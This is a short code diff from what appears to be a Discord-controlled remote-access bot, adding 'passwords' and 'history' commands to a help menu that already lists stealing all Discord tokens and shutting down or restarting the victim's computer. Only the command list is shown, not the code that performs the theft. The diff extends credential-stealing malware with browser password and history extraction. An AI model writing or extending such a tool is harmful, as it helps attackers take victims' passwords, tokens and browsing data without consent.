@@ -51,6 +51,8 @@ commands = "\n".join([
     "tokens - Get all discord tokens",
     "shutdown - Shutdown the computer",
     "restart - Restart the computer",
+    "passwords - Extracts all browser passwords",
+    "history - Extracts all browser history",
 ])
 
 @bot.event
